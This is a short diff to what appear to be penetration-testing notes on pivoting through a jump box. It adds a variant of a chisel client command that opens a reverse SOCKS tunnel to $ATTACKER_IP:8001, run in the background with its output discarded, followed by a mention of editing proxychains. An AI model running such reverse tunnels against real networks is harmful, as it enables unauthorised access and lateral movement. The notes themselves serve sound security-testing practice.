@@ -25,6 +25,12 @@ on jump box
 ./chisel client --max-retry-count 1 $ATTACKER_IP:8001 R:socks
 ```
 
+or as a background process to free up the shell
+
+```bash
+./chisel client --max-retry-count 1 $ATTACKER_IP:8001 R:socks > /dev/null 2>&1 &
+```
+
 Then edit proxychains config:
   
 ```config
